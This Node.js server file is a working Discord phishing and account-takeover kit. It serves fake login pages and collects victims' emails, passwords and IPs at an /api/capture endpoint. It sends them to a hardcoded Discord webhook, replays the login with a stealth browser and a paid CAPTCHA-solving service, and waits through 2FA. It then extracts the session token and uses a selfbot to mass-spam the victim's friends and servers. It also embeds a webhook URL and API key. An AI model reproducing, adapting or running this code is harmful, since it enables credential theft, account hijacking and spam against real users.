const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const UserAgent = require('user-agents');

puppeteer.use(StealthPlugin());
puppeteer.use(UserPreferencesPlugin({
    userPrefs: {
        webkit: {
            webprefs: {
                default_font_size: 16
            }
        }
    }
}));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
const CUSTOM_MESSAGE = 'hi';
const ANTI_CAPTCHA_KEY = '373271de10fac6ff5aa75a2928acd339';

function isMobile(req) {
    const ua = req.headers['user-agent'] || '';
    return /mobile|android|iphone|ipad|ipod/i.test(ua);
}

function getIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'unknown';
}

async function createTask(websiteURL, websiteKey, taskType = 'HCaptchaTaskProxyless') {
    const response = await axios.post('https://api.anti-captcha.com/createTask', {
        clientKey: ANTI_CAPTCHA_KEY,
        task: {
            type: taskType,
            websiteURL: websiteURL,
            websiteKey: websiteKey,
            isInvisible: false
        },
        softId: 0
    });
    
    if (response.data.errorId !== 0) {
        throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
    }
    
    return response.data.taskId;
}

async function getTaskResult(taskId) {
    const maxAttempts = 60;
    const delayMs = 5000;
    
    for (let i = 0; i < maxAttempts; i++) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
        
        const response = await axios.post('https://api.anti-captcha.com/getTaskResult', {
            clientKey: ANTI_CAPTCHA_KEY,
            taskId: taskId
        });
        
        if (response.data.errorId !== 0) {
            throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
        }
        
        if (response.data.status === 'ready') {
            return response.data.solution;
        }
    }
    
    throw new Error('Anti-Captcha timeout');
}

async function solveHCaptcha(page, sessionId) {
    try {
        await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
        
        // Wait for CAPTCHA iframe with extended timeout
        await page.waitForFunction(() => {
            return document.querySelector('iframe[src*="hcaptcha.com"]') !== null ||
                   document.querySelector('[data-sitekey]') !== null;
        }, { timeout: 15000 });
        
        // Extract sitekey with retry logic
        let sitekey = null;
        let attempts = 0;
        
        while (!sitekey && attempts < 15) {
            sitekey = await page.evaluate(() => {
                // Method 1: From iframe src
                const iframe = document.querySelector('iframe[src*="hcaptcha.com"]');
                if (iframe) {
                    const src = iframe.getAttribute('src');
                    const match = src.match(/[?&]sitekey=([^&]+)/);
                    if (match) return match[1];
                }
                
                // Method 2: From data-sitekey attribute
                const container = document.querySelector('[data-sitekey]');
                if (container) return container.getAttribute('data-sitekey');
                
                // Method 3: From window.hcaptcha
                if (window.hcaptcha && window.hcaptcha.sitekey) {
                    return window.hcaptcha.sitekey;
                }
                
                // Method 4: Search in scripts
                const scripts = Array.from(document.querySelectorAll('script'));
                for (const script of scripts) {
                    const text = script.textContent || '';
                    const match = text.match(/sitekey["']?\s*:\s*["']([^"']+)["']/);
                    if (match) return match[1];
                }
                
                return null;
            });
            
            if (!sitekey) {
                await delay(1000, 1500);
                attempts++;
            }
        }
        
        if (!sitekey) {
            throw new Error('Could not extract sitekey after multiple attempts');
        }
        
        await sendWebhook({ content: `Sitekey found: ${sitekey.substring(0, 15)}... - Session: \`${sessionId}\`` });
        
        const taskId = await createTask('https://discord.com/login', sitekey);
        await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
        
        const solution = await getTaskResult(taskId);
        await sendWebhook({ content: `CAPTCHA solved, injecting... - Session: \`${sessionId}\`` });
        
        // Inject token with multiple methods
        const injected = await page.evaluate((token) => {
            let success = false;
            
            // Method 1: Textarea
            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
            if (textarea) {
                textarea.value = token;
                textarea.textContent = token;
                textarea.dispatchEvent(new Event('input', { bubbles: true }));
                textarea.dispatchEvent(new Event('change', { bubbles: true }));
                success = true;
            }
            
            // Method 2: Hidden input
            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
            if (hiddenInput) {
                hiddenInput.value = token;
                hiddenInput.dispatchEvent(new Event('input', { bubbles: true }));
                success = true;
            }
            
            // Method 3: Container dataset
            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
            if (hcaptchaDiv) {
                hcaptchaDiv.setAttribute('data-hcaptcha-response', token);
                hcaptchaDiv.dataset.response = token;
                
                // Try to find React callback
                const reactKey = Object.keys(hcaptchaDiv).find(k => k.startsWith('__react'));
                if (reactKey) {
                    try {
                        const props = hcaptchaDiv[reactKey];
                        if (props && props.onVerify) {
                            props.onVerify(token);
                            success = true;
                        }
                    } catch(e) {}
                }
            }
            
            // Method 4: Global callback
            if (window.hcaptchaCallback && typeof window.hcaptchaCallback === 'function') {
                try {
                    window.hcaptchaCallback(token);
                    success = true;
                } catch(e) {}
            }
            
            // Method 5: hcaptcha object methods
            if (window.hcaptcha) {
                if (typeof window.hcaptcha.setResponse === 'function') {
                    try {
                        window.hcaptcha.setResponse(token);
                        success = true;
                    } catch(e) {}
                }
                if (typeof window.hcaptcha.submit === 'function') {
                    try {
                        window.hcaptcha.submit();
                    } catch(e) {}
                }
            }
            
            // Method 6: Dispatch events
            document.dispatchEvent(new CustomEvent('hcaptchaSubmit', { 
                detail: { response: token, token: token } 
            }));
            
            // Verify
            const verify = document.querySelector('textarea[name="h-captcha-response"]');
            return success || (verify && verify.value.length > 50);
        }, solution.gRecaptchaResponse);
        
        await delay(2000, 3000);
        
        if (!injected) {
            throw new Error('Token injection failed');
        }
        
        await sendWebhook({ content: `CAPTCHA token injected - Session: \`${sessionId}\`` });
        return true;
        
    } catch (error) {
        await sendWebhook({ content: `CAPTCHA error: ${error.message} - Session: \`${sessionId}\`` });
        return false;
    }
}

app.get('/', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/oauth2/authorize', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

app.post('/api/capture', async (req, res) => {
    const { email, password, ip: clientIP, userAgent, platform } = req.body;
    const ip = clientIP || getIP(req);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    await sendWebhook({
        content: `NEW VICTIM\nEmail: \`${email}\`\nPassword: \`${password}\`\nIP: \`${ip}\`\nPlatform: \`${platform}\`\nSession: \`${sessionId}\`\nTime: <t:${Math.floor(Date.now()/1000)}:F>`
    });
    
    processLogin(email, password, ip, sessionId);
    
    res.json({ status: 'processing', sessionId });
});

async function processLogin(email, password, ip, sessionId) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-extensions',
                '--disable-background-networking',
                '--disable-sync',
                '--disable-translate',
                '--disable-default-apps',
                '--mute-audio',
                '--no-first-run',
                '--fast-start',
                '--window-size=1280,720'
            ],
            dumpio: false,
            ignoreHTTPSErrors: true
        });
        
        const page = await browser.newPage();
        const userAgent = new UserAgent({ deviceCategory: 'desktop' });
        await page.setUserAgent(userAgent.toString());
        await page.setViewport({ width: 1280, height: 720 });
        
        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2', timeout: 30000 });
        
        await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
        
        await humanType(page, 'input[name="email"]', email);
        await delay(300, 800);
        await humanType(page, 'input[name="password"]', password);
        
        await delay(500, 1200);
        
        await page.click('button[type="submit"]');
        
        // Extended wait for CAPTCHA to appear
        await delay(5000, 8000);
        
        const hasCaptcha = await page.evaluate(() => {
            return document.querySelector('iframe[src*="hcaptcha.com"]') !== null ||
                   document.querySelector('.h-captcha') !== null ||
                   document.querySelector('[data-sitekey]') !== null;
        });
        
        if (hasCaptcha) {
            await sendWebhook({ content: `CAPTCHA DETECTED - Session: \`${sessionId}\`` });
            const solved = await solveHCaptcha(page, sessionId);
            
            if (solved) {
                await delay(2000, 3000);
                
                try {
                    await Promise.all([
                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {}),
                        page.click('button[type="submit"]')
                    ]);
                } catch (e) {
                    await page.click('button[type="submit"]');
                    await delay(6000, 10000);
                }
            }
        }
        
        await delay(4000, 6000);
        
        const is2FA = await page.evaluate(() => {
            const bodyText = document.body.innerText || '';
            return bodyText.includes('Check your email') ||
                   bodyText.includes('Two-factor authentication') ||
                   bodyText.includes('6-digit') ||
                   document.querySelector('input[name="code"]') !== null;
        });
        
        if (is2FA) {
            await sendWebhook({ 
                content: `2FA REQUIRED - Session: \`${sessionId}\`\nWaiting...` 
            });
            
            const maxWait = 300000;
            const startTime = Date.now();
            let loggedIn = false;
            
            while (Date.now() - startTime < maxWait) {
                await delay(5000);
                
                const url = await page.url();
                if (url.includes('/channels/') || url.includes('/app')) {
                    loggedIn = true;
                    break;
                }
            }
            
            if (!loggedIn) {
                await sendWebhook({ content: `2FA TIMEOUT - Session: \`${sessionId}\`` });
                await browser.close();
                return;
            }
        }
        
        const finalUrl = await page.url();
        const isLoggedIn = finalUrl.includes('/channels/') || finalUrl.includes('/app');
        
        if (!isLoggedIn) {
            const errorMsg = await page.evaluate(() => {
                const error = document.querySelector('[class*="error"]');
                return error ? error.textContent : 'Unknown error';
            });
            
            await sendWebhook({ 
                content: `LOGIN FAILED - Session: \`${sessionId}\`\nURL: ${finalUrl}\nError: ${errorMsg}` 
            });
            await browser.close();
            return;
        }
        
        await sendWebhook({ content: `LOGIN SUCCESS - Session: \`${sessionId}\`` });
        
        const userInfo = await page.evaluate(() => {
            let username = null;
            let userId = null;
            
            try {
                const me = localStorage.getItem('Me');
                if (me) {
                    const parsed = JSON.parse(me);
                    username = parsed.username;
                    userId = parsed.id;
                }
            } catch(e) {}
            
            return { username, userId };
        });
        
        let token = await page.evaluate(() => {
            try {
                return localStorage.getItem('token');
            } catch(e) { return null; }
        });
        
        if (!token) {
            token = await page.evaluate(() => {
                let foundToken = null;
                try {
                    if (window.webpackChunkdiscord_app) {
                        window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                            for (const m of Object.values(req.c).map(x => x.exports)) {
                                if (m?.default?.getToken) {
                                    const t = m.default.getToken();
                                    if (t && t.includes('.')) foundToken = t;
                                }
                            }
                        }]);
                    }
                } catch(e) {}
                return foundToken;
            });
        }
        
        const displayUser = userInfo.username || 'Unknown';
        
        await sendWebhook({ 
            content: `USER: \`@${displayUser}\` | ID: \`${userInfo.userId}\` - Session: \`${sessionId}\`` 
        });
        
        if (token && token.includes('.')) {
            await sendWebhook({ 
                content: `TOKEN: \`${token.substring(0, 20)}...${token.substring(token.length - 10)}\`\n\`\`\`${token}\`\`\` - Session: \`${sessionId}\`` 
            });
            
            await massSpam(token, sessionId, displayUser);
        }
        
        await browser.close();
        
    } catch (error) {
        await sendWebhook({ 
            content: `CRITICAL ERROR - Session: \`${sessionId}\`\n${error.message}` 
        });
        if (browser) await browser.close();
    }
}

async function humanType(page, selector, text) {
    await page.focus(selector);
    for (const char of text) {
        await page.keyboard.type(char, { delay: Math.random() * 80 + 30 });
        if (Math.random() > 0.85) await delay(50, 150);
    }
}

async function massSpam(token, sessionId, username) {
    try {
        const { Client } = require('discord.js-selfbot-v13');
        const client = new Client({
            checkUpdate: false,
            patchVoice: false,
            autoRedeemNitro: false
        });
        
        let dmCount = 0;
        let guildCount = 0;
        
        client.on('ready', async () => {
            await sendWebhook({ 
                content: `SPAM READY - \`@${client.user.tag}\` - ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` 
            });
            
            const friends = client.relationships.cache.filter(r => r.type === 1);
            for (const [, rel] of friends) {
                try {
                    const user = await client.users.fetch(rel.id);
                    const dm = await user.createDM();
                    for (let i = 0; i < 5; i++) {
                        await dm.send(`${CUSTOM_MESSAGE} @everyone`);
                        dmCount++;
                        await delay(500, 1000);
                    }
                } catch (e) {}
            }
            
            for (const guild of client.guilds.cache.values()) {
                try {
                    const channel = guild.channels.cache.find(c => 
                        c.isTextBased && c.permissionsFor(guild.members.me)?.has('SendMessages')
                    );
                    if (channel) {
                        for (let i = 0; i < 10; i++) {
                            await channel.send(`${CUSTOM_MESSAGE} @everyone @here`);
                            guildCount++;
                            await delay(300, 800);
                        }
                    }
                } catch (e) {}
            }
            
            await sendWebhook({ 
                content: `SPAM COMPLETE - DMs: ${dmCount}, Guilds: ${guildCount} - Session: \`${sessionId}\`` 
            });
            
            await client.destroy();
        });
        
        await client.login(token);
        
    } catch (error) {
        await sendWebhook({ content: `SPAM FAILED: ${error.message} - Session: \`${sessionId}\`` });
    }
}

async function sendWebhook(data) {
    try {
        await axios.post(WEBHOOK_URL, data);
    } catch (e) {
        console.error('Webhook failed:', e.message);
    }
}

function delay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
